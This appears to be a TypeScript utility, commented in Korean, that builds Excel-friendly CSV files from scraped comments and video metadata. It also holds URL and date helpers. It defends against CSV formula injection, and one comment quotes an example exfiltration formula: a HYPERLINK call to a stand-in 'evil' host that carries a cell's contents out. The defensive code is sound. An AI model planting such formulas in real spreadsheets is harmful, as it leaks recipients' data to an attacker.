// 표 형태 결과를 CSV 문자열로 만드는 공용 빌더.
//
// keyword-csv.ts / ad-copy-csv.ts 와 동일한 규약을 따른다:
//   1행 제목 · 2행 생성일 · (선택) 부가 정보행 · 공백행 · 헤더행 · 데이터행
//   인코딩은 UTF-8 + BOM, 줄바꿈은 CRLF (엑셀에서 한글·줄바꿈이 깨지지 않는다)

import { escapeCsvCell } from "@/lib/keyword-csv";

/**
 * 수식 인젝션(CSV injection) 방어.
 *
 * 이 빌더가 다루는 값에는 **외부인이 작성한 문자열**(블로그·인스타 댓글, 유튜브 제목/설명/태그)이
 * 그대로 들어간다. 엑셀·구글시트는 셀이 = + - @ 나 탭/캐리지리턴으로 시작하면 수식으로 해석하므로,
 * `=HYPERLINK("http://evil/?d="&A1,"당첨확인")` 같은 댓글이 파일을 연 담당자 환경에서 실행될 수 있다.
 *
 * 앞에 작은따옴표를 붙이면 스프레드시트가 텍스트로 강제 인식하며, 표시상으로도 원문이 그대로 보인다.
 */
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

/** 수식 무해화 → CSV 이스케이프 순서로 처리한다 */
function cell(value: string | number): string {
  return escapeCsvCell(neutralizeFormula(String(value)));
}

export interface TableCsvOptions {
  /** CSV 1행 제목 (예: "네이버 블로그 댓글 수집") */
  title: string;
  /** 생성일 (YYYY.MM.DD) */
  createdDate: string;
  /** 생성일 아래에 덧붙일 정보행 (예: "수집 대상: blog.naver.com/xxx/123") */
  meta?: string[];
  headers: string[];
  rows: (string | number)[][];
}

/** 옵션을 받아 CSV 문자열(BOM 포함)을 만든다 */
export function buildTableCsv({
  title,
  createdDate,
  meta = [],
  headers,
  rows,
}: TableCsvOptions): string {
  const lines: string[][] = [
    [title],
    [`생성일: ${createdDate}`],
    ...meta.map((m) => [m]),
    [],
    headers,
    ...rows.map((row) => row.map(String)),
  ];

  const body = lines.map((cells) => cells.map(cell).join(",")).join("\r\n");

  return `﻿${body}`;
}

/**
 * 수집 대상 URL에서 파일명에 쓸 짧은 라벨을 만든다.
 * (URL 전체를 safeFileName 에 넣으면 도메인까지 붙어 알아보기 어려운 이름이 된다)
 *
 * 예: https://blog.naver.com/abc/12345 → "abc_12345"
 */
export function urlFileLabel(url: string): string {
  try {
    const normalized = url.trim().startsWith("http")
      ? url.trim()
      : `https://${url.trim()}`;
    const parsed = new URL(normalized);
    const segments = parsed.pathname.split("/").filter(Boolean);

    if (segments.length > 0) return segments.slice(-2).join("_");

    // 경로가 없으면 쿼리(모바일 블로그 형식)에서 뽑는다
    const blogId = parsed.searchParams.get("blogId");
    const logNo = parsed.searchParams.get("logNo");
    if (blogId && logNo) return `${blogId}_${logNo}`;

    return parsed.hostname;
  } catch {
    return "result";
  }
}

/** 파일명에 붙일 오늘 날짜 (YYYYMMDD, 한국 기준) */
export function fileDateStamp(): string {
  return new Intl.DateTimeFormat("en-CA", {
    timeZone: "Asia/Seoul",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  })
    .format(new Date())
    .replace(/-/g, "");
}

/** CSV 제목행에 넣을 오늘 날짜 (YYYY.MM.DD, 한국 기준) */
export function csvDateStamp(): string {
  return new Intl.DateTimeFormat("en-CA", {
    timeZone: "Asia/Seoul",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  })
    .format(new Date())
    .replace(/-/g, ".");
}
